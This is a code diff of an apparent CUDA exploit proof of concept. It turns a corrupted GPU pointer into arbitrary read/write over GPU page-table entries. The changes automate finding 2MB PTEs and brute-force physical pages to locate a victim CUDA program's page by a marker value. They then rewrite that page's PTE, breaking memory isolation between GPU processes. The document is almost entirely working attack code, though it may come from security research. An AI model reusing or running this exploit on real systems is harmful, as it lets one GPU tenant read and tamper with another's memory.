@@ -32,7 +32,7 @@ main (int argc, char *argv[])
   
   char * flush_ptr;
   uint8_t *data_device_ptr;
-  uint64_t flush_size = 4L * 1024 * 1024 * 1024;
+  uint64_t flush_size = 3L * 1024 * 1024 * 1024;
   cudaMallocManaged(&flush_ptr, flush_size);
   cudaMallocManaged(&data_device_ptr, 2L * 1024 * 1024);
 
@@ -50,27 +50,54 @@ main (int argc, char *argv[])
 
   uint64_t arb_rw_ofs;
   
-  uint64_t initial_offset_1;
-  uint64_t initial_offset_2;
-  std::cout << "This application helps transfers Arbitrary RW to another CUDA application: \n"
-            << "(1) Ptr for Arbitrary RW (2) Pointer to PT Region (3) Offset to PTE of Ptr for Arbitrary RW" <<'\n';
-  std::cout << "Please select two 2MB PTE addresses and enter them:" << '\n';
-  std::cout << "Enter the first one:" << '\n' << std::flush;
-  std::cin >> std::hex >> initial_offset_1;
-  std::cout << "Enter the second one:" << '\n' << std::flush;
-  std::cin >> std::hex >> initial_offset_2;
-  std::cin >> std::dec;
+  uint64_t initial_offset_1 = 0;
+  uint64_t initial_offset_2 = 0;
+  // std::cout << "This application helps transfers Arbitrary RW to another CUDA application: \n"
+  //           << "(1) Ptr for Arbitrary RW (2) Pointer to PT Region (3) Offset to PTE of Ptr for Arbitrary RW" <<'\n';
+  // std::cout << "Please select two 2MB PTE addresses and enter them:" << '\n';
+  // std::cout << "Enter the first one:" << '\n' << std::flush;
+  // std::cin >> std::hex >> initial_offset_1;
+  // std::cout << "Enter the second one:" << '\n' << std::flush;
+  // std::cin >> std::hex >> initial_offset_2;
+  // std::cin >> std::dec;
 
   void* arb_rw_orig_ptr = nullptr;
   void* arb_rw_ptr = nullptr;
   void* pt_rw_orig_ptr = nullptr;
 
-  // cudaMemcpyArray(corrupted_ptr + 0xc100, data_device_ptr, 8);
-  cudaMemcpyArray(data_device_ptr, corrupted_ptr + initial_offset_1, 8);
-  arb_rw_orig_ptr = *(void**)data_device_ptr;
+  const uint64_t null_pte =(uint64_t)(0x0600000000000001);
+  const uint64_t mask_2MB_pte =        0xFF000000000FFFFULL;
+  cudaMemcpyArray(data_device_ptr, corrupted_ptr, 64L * 1024);
 
-  cudaMemcpyArray(data_device_ptr, corrupted_ptr + initial_offset_2, 8);
-  pt_rw_orig_ptr = *(void**)data_device_ptr;
+  for (uint64_t z = 0; z < 64L * 1024; z+=16)
+    {
+      DBG_OUT << (void*)z << ' ' << *(void**)(data_device_ptr + z) << ' ' << (void*)((*(uint64_t *)(data_device_ptr + z)) & mask_2MB_pte) << '\n';
+      if (((*(uint64_t *)(data_device_ptr + z)) & mask_2MB_pte) == null_pte && arb_rw_orig_ptr == nullptr)
+      {
+        arb_rw_orig_ptr = *(void**)(data_device_ptr + z);
+        initial_offset_1 = z;
+        DBG_OUT << "Found " << arb_rw_orig_ptr << '\n';
+      }
+      else if (((*(uint64_t *)(data_device_ptr + z)) & mask_2MB_pte) != (null_pte) && arb_rw_orig_ptr != nullptr)
+      {
+        arb_rw_orig_ptr = nullptr;
+        initial_offset_1 = 0;
+      }
+      else if (((*(uint64_t *)(data_device_ptr + z)) & mask_2MB_pte) == (null_pte))
+      {
+        pt_rw_orig_ptr = *(void**)(data_device_ptr + z);
+        initial_offset_2 = z;
+        DBG_OUT << "Found" << arb_rw_orig_ptr <<'\n';
+        break;
+      }
+      
+    }
+
+    if (debug_enabled())
+    {
+      std::cout << "Done \n";
+      paused();
+    }
 
   memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_1, (uint64_t)(0x60000000000001), 8);
   cudaDeviceSynchronize();
@@ -81,10 +108,10 @@ main (int argc, char *argv[])
   for (int j = 0; j < cudaMalloced_ptrs.size(); j++)
   {
     cudaMemcpyArray(data_device_ptr, (uint8_t*)cudaMalloced_ptrs[j], 8);
-    std::cout << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << '\n';
+    DBG_OUT << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << '\n';
     if (*(void**)data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
     {
-      std::cout << "Arb:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n' << std::flush;
+      DBG_OUT << "Arb:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n' << std::flush;
       arb_rw_ptr = (void *)cudaMalloced_ptrs[j];
       arb_rw_ofs = j;
       break;
@@ -92,11 +119,11 @@ main (int argc, char *argv[])
     gpuErrchk(cudaPeekAtLastError());
   }
 
-  uint64_t it_ptr = (uint64_t)(0x60000000000001);
+  uint64_t it_ptr = (uint64_t)(0x600000000000001);
   uint64_t target_pte_ofs = ((uint64_t)corrupted_ptr + initial_offset_1) % (2L * 1024 * 1024);
   for (uint64_t i = 0; i < (uint64_t)23L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
     {
-      if (i > (uint64_t)14L * 1024 * 1024 * 1024)
+      if (i > (uint64_t)0L * 1024 * 1024 * 1024)
       { 
         memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_1, it_ptr, 8);
         cudaDeviceSynchronize();
@@ -105,10 +132,10 @@ main (int argc, char *argv[])
         cudaDeviceSynchronize();
         cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr + target_pte_ofs, 8);
         // cudaMemcpy(&value_of_pointer, (uint8_t*)arb_rw_ptr + ((uint64_t)corrupted_ptr + 0xc100) % (2L * 1024 * 1024), 8, cudaMemcpyDeviceToHost);
-        std::cout << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
+        DBG_OUT << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
         if (*(void**)data_device_ptr == (void*)it_ptr)
         {
-          std::cout << *(void**)data_device_ptr << '\n';
+          DBG_OUT << *(void**)data_device_ptr << '\n';
           break;
         }
         cudaDeviceSynchronize();
@@ -141,18 +168,20 @@ main (int argc, char *argv[])
 
 
   cudaMemcpyArray(data_device_ptr, (uint8_t*)pt_rw_ptr + target_pte_ofs, 8);
-  std::cout << "PT rw:" << *(void**)data_device_ptr <<  " Orig: "<< pt_rw_orig_ptr << '\n';
+  DBG_OUT << "PT rw:" << *(void**)data_device_ptr <<  " Orig: "<< pt_rw_orig_ptr << '\n';
   cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
-  std::cout << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';
+  DBG_OUT << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';
 
-   std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+  std::cout << "(Stable Primitive Ready) Start your program now and load it with 0x6464646464646464. Press "
+                "\033[1;32mEnter Key\033[0m to start finding and modifing that page's PTE."
+              << '\n';
   paused();
   
-  it_ptr = (uint64_t)(0x60000000000001);
+  it_ptr = (uint64_t)(0x600000000000001);
   void* target = 0;
   for (uint64_t i = 0; i < (uint64_t)46L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
     {
-      if (i > (uint64_t)5L * 1024 * 1024 * 1024)
+      if (i > (uint64_t)0L * 1024 * 1024 * 1024)
       {
         memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, it_ptr, 8);
         cudaDeviceSynchronize();
@@ -161,12 +190,12 @@ main (int argc, char *argv[])
         cudaDeviceSynchronize();
 
         cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
-        std::cout << i << ' '<< (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
+        DBG_OUT << i << ' '<< (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
         bool ispage = true;
         if (*(void**)(data_device_ptr) == (void*)0x6464646464646464)
         {
           target = (void*)it_ptr;
-            std::cout << "Found" << '\n';
+            std::cout << "Found your page in " << (void*) it_ptr << ", Value: "<< (void*)0x6464646464646464 << '\n';
             break;
         }
 
@@ -176,15 +205,16 @@ main (int argc, char *argv[])
       it_ptr += 0x20000;
     }
 
-  std::cout << (void*)target << '\n';
-  paused();
+  DBG_OUT << (void*)target << '\n';
+  if (debug_enabled())
+    paused();
   uint64_t other_ofs = 0;
   uint64_t other_phys = 0;
-  it_ptr = (uint64_t)(0x60000000000001);
-  uint64_t mask =     0x00FFFFFFFFFF00ULL;
+  it_ptr = (uint64_t)(0x0600000000000001);
+  uint64_t mask =     0x00FFFFFFFFFFFF00ULL;
   for (uint64_t i = 0; i < (uint64_t)46L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
     {
-      if (i > (uint64_t)14L * 1024 * 1024 * 1024)
+      if (i > (uint64_t)0L * 1024 * 1024 * 1024)
       {
         memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, it_ptr, 8);
         cudaDeviceSynchronize();
@@ -193,7 +223,7 @@ main (int argc, char *argv[])
         cudaDeviceSynchronize();
 
         cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
-        std::cout << i << ' ' << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
+        DBG_OUT << i << ' ' << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
         for (uint64_t z = 0; z < 2L * 1024 * 1024; z+=8)
         {
           // std::cout << '\t' << z << ' ' << (void*)it_ptr << ' ' << *(void**)(data_device_ptr + z) << '\n';
@@ -202,7 +232,7 @@ main (int argc, char *argv[])
           {
             other_ofs = z;
             other_phys = it_ptr;
-            std::cout << "Found" << '\n';
+            DBG_OUT << "Found" << '\n';
             break;
           }
         }
@@ -220,6 +250,7 @@ main (int argc, char *argv[])
   gen_64KB(flush_ptr, flush_size);
   simple_flush<<<1,1>>>(flush_ptr, flush_size);
   cudaDeviceSynchronize();
+  std::cout << "Found its PTE, modified your pointer's PTE to point to: "<< (void*) 0x060000000fff0005 << '\n';
   
 
   // cudaIpcMemHandle_t pt_handle;
